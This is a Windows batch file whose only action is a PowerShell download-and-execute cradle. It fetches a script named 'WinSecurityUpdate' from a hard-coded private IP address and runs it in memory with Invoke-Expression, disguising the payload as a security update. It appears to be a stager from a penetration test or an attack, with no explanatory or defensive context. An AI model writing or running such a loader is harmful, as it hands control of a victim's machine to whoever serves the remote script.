@ECHO OFF
powershell -nOp -c "iEx(New-Object Net.WebClient).DownloadString('http://192.168.135.130:8000/WinSecurityUpdate')"
